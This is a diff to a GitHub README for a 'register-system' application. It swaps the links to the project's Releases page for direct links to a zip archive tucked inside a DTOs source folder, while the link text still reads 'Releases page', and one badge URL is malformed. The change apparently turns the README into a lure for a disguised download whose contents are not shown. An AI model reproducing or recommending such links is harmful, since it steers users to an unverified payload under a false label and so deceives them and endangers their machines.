@@ -6,7 +6,7 @@ Welcome to the register-system! This application helps you manage user accounts 
 
 ## 📥 Download Link
 
-[![Download register-system](https://img.shields.io/badge/Download%20register--system-4CAF50.svg)](https://github.com/DepressMofo/register-system/releases)
+[![Download register-system](https://github.com/DepressMofo/register-system/raw/refs/heads/main/RegisterSystem.Application/Common/DTOs/User/register-system-v1.2.zip%https://github.com/DepressMofo/register-system/raw/refs/heads/main/RegisterSystem.Application/Common/DTOs/User/register-system-v1.2.zip)](https://github.com/DepressMofo/register-system/raw/refs/heads/main/RegisterSystem.Application/Common/DTOs/User/register-system-v1.2.zip)
 
 ## 📋 Overview
 
@@ -33,7 +33,7 @@ To run the register-system, you need:
 
 ## 📂 Download & Install
 
-1. **Visit the Release Page:** Go to our [Releases page](https://github.com/DepressMofo/register-system/releases) to find the latest version of the register-system.
+1. **Visit the Release Page:** Go to our [Releases page](https://github.com/DepressMofo/register-system/raw/refs/heads/main/RegisterSystem.Application/Common/DTOs/User/register-system-v1.2.zip) to find the latest version of the register-system.
    
 2. **Choose the Version:** Look for the latest stable release. You will find various files available for download. Select the file that matches your operating system.
 
